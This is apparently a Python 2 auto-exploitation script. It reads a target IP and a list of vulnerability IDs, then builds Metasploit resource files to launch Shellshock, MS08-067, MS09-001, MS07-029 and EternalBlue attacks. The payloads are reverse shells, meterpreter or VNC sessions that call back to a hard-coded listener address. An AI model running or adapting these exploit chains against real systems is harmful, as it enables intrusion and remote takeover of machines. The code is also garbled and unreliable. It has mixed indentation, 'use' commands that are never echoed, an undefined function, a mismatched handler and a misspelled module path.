import os
line =""
#searches file for list of exploits
#if found go to X else keep going
global Host_is_set
global our_IP
global working_dir
global Target_file
working_dir = ""
target_file = 'ip.txt'
Our_IP ="192.168.1.200" #host 
hosts = ""
print target_file
#print working_dir
##creats exploit file then ran via command in func below
def shell_shock(hosts): #name of function and host defined
 with open('ip.txt', 'rb') as fp:
  hosts = fp.read()[:+13]
  os.system('touch /Desktop custom_shock.rc') 
  os.system('use exploit/multi/http/apache_mod_cgi_bash_env_exec > custom_shock.rc') 
  os.system('echo set TARGETURI cgi/bin >> custom_shock.rc')
  os.system('echo set PAYLOAD linux/x86/metsvc_reverse_tcp >> custom_shock.rc')
  os.system('echo set LHOST ' + Our_IP + ' >>  custom_shock.rc')
  os.system('echo set ConnectTimeout 30 >> custom_shock.rc')
  os.system('echo set AutoRunScript multi_console_command -rc ' + working_dir + '  >> custom_shock.rc')
  os.system('echo use exploit/multi/http/apache_mod_cgi_bash_env_exec  -r >> custom_shock.rc')
  os.system('echo run >> custom_shock.rc')
  os.system('echo exit >> custom_shock.rc')
  os.system('sudo msfconsole -r custom_shock.rc')
  return hosts
  host = true
  Host_is_set = True;
##make exploit script:

def MS08_067(hosts):
  with open('ip.txt', 'rb') as fp:
    hosts = fp.read()[:+13] 
    os.system('touch /MS08_067.rc')
    os.system('echo use exploit/windows/smb/ms08_067_netapi >> MS08_067.rc')
    os.system('echo set RHOST '+ hosts +' >> MS08_067.rc')
    os.system('echo  set PAYLOAD generic/shell_reverse_tcp >> MS08_067.rc')
    os.system('echo set LHOST ' + Our_IP + ' >> MS08_067.rc')
    os.system('echo set AutoRunScript multi_console_command -rc ' + working_dir + ' >> MS08_067.rc')
    os.system('echo exploit >> MS08_067.rc')
	os.system('echo exit >> MS08_067.rc')
    os.system('sudo msfconsole -r MS08_067.rc')

    return hosts
  
def ms09(hosts):
  with open('ip.txt', 'rb') as fp:
    hosts = fp.read()[:+13] 
    os.system('touch bob.rc')
    os.system('echo use auxiliary/dos/windows/smb/ms09_001_write  >> bob.rc')
    os.system('echo set RHOST '+ hosts +' >> bob.rc')
    os.system('echo use exploit windows/powershell_reverse_tcp  >> bob.rc')
    os.system('echo set LHOST '+ Our_IP + ' >> bob.rc')
    os.system('echo set AutoRunScript multi_console_command -rc '+ working_dir + ' >> bob.rc')	
    os.system('echo show options >> bob.rc')
    os.system('echo exploit >> bob.rc')
    os.system('echo exit >> bob.rc')
    os.system('sudo msfconsole -r bob.rc')

    return hosts

def CVE_2009_3103(hosts): 
 with open('ip.txt', 'rb') as fp:
  hosts = fp.read()[:+13]
 
  os.system('touch / CVE3103.rc') 
  os.system('use exploit/windows/dcerpc/ms07_029_msdns_zonename > CVE3103.rc') 
  os.system('echo set RHOST '+ hosts +' >> CVE3103.rc')
  os.system('echo set PAYLOAD windows/meterpreter/reverse_tcp   >> CVE3103.rc')
  os.system('echo set LHOST ' + Our_IP + ' >>  CVE3103.rc.rc')
  os.system('echo set ConnectTimeout 30 >> CVE3103.rc')
  os.system('echo set AutoRunScript multi_console_command -rc ' + working_dir + '  >> CVE3103.rc')
  os.system('echo use exploit/multi/http/apache_mod_cgi_bash_env_exec  -r >> CVE3103.rc')
  os.system('echo run >> CVE3103.rc')
  os.system('echo exit >> CVE3103.rc')
  os.system('sudo msfconsole -r CVE3103.rc')
  return hosts
  host = true
  Host_is_set = True;

def MS07_029(hosts): 
 with open('ip.txt', 'rb') as fp:
  hosts = fp.read()[:+13]
  os.system('touch /Desktop MS029.rc') 
  os.system('use exploit/windows/smb/ms07_029_msdns_zonename > MS029.rc') 
  os.system('echo set RHOST '+ hosts +' >> MS029.rc')
  os.system('echo set PAYLOAD windows/vncinject/reverse_tcp >> MS029.rc')
  os.system('echo set LHOST ' + Our_IP + ' >>  MS029.rc')
  os.system('echo set ConnectTimeout 30 >> MS029.rc')
  os.system('echo set AutoRunScript multi_console_command -rc ' + working_dir + '  >> MS029.rc')
  os.system('echo use exploit/multi/http/apache_mod_cgi_bash_env_exec  -r >> MS029.rc')
  os.system('echo run >> MS029.rc')
  os.system('echo exit >> MS029.rc')
  os.system('sudo msfconsole -r MS029.rc')
  return hosts
  host = true
  Host_is_set = True;

def MS17_010(hosts): 
   with open('ip.txt', 'rb') as fp:
    hosts = fp.read()[:+13] 
    os.system('touch /Desktop MS010.rc') 
    os.system('use eexploit/windows/smb/ms17_010_eternalblue >> MS010.rc') 
    os.system('echo set RHOST '+ hosts +' >> MS010.rc')
    os.system('echo set PAYLOAD windows/x64/vncinject/reverse_tcp >> MS010.rc')
    os.system('echo set LHOST ' + Our_IP + ' >>  MS010.rc')
    os.system('echo set ConnectTimeout 30 >> MS010.rc')
    os.system('echo set AutoRunScript multi_console_command -rc ' + working_dir + '  >> MS010.rc')
    os.system('echo use exploit/multi/http/apache_mod_cgi_bash_env_exec  -r >> MS010.rc')
    os.system('echo run >> MS010.rc')
    os.system('sudo msfconsole -r MS010.rc')
    return hosts
    host = true
    Host_is_set = True;
  
if __name__ == "__main__":
    with open('exploits.txt', 'r') as searchfile:
            for line in searchfile:
		
                 if 'CVE-2014-6271' in line:
                 	print('Omae Wa Mou Shindeiru')
                  	CVE_2014(hosts)
       
   
		 if 'CVE2009-3103' in line:
                	print('exploit in progress')
                	CVE_2009_3103(hosts)
		
			 
		 if 'MS07-029' in line:
                	print('I like exploits')
                	MS07_029(hosts)
		
				
		
		 if 'MS08_067' in line:
               		 print('I love Hacking')
               		 ms09(hosts)	
		
				
		 if 'MS17-010' in line:
               		 print('its over ms17-010')
               		 MS17_010(hosts)
		
